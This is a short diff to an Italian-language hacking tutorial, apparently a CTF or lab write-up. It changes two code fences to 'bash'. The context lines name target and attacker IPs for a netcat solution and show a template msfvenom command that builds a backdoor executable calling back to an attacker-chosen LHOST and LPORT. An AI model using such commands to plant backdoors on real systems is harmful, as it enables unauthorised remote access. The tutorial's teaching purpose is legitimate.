@@ -114,7 +114,7 @@ Normalmente risolverei un problema del genere scrivendo uno script o dei comandi
 
 Risoluzione con Bash & netcat:
 
-```
+```bash
 # Target: 172.16.166.130
 # Attacker: 192.168.1.116
 
@@ -131,7 +131,7 @@ MSFvenom è un CLI-tool (strumento via terminale) che porta con sé un numero im
 
 In pratica MSFvenom genera un file backdoor con le nostre preferenze di: payload, formato, target…
 
-```
+```bash
 msfvenom -p [payload] LHOST=[our IP] LPORT=[our port] -f exe > backdoor.exe
 ```
 
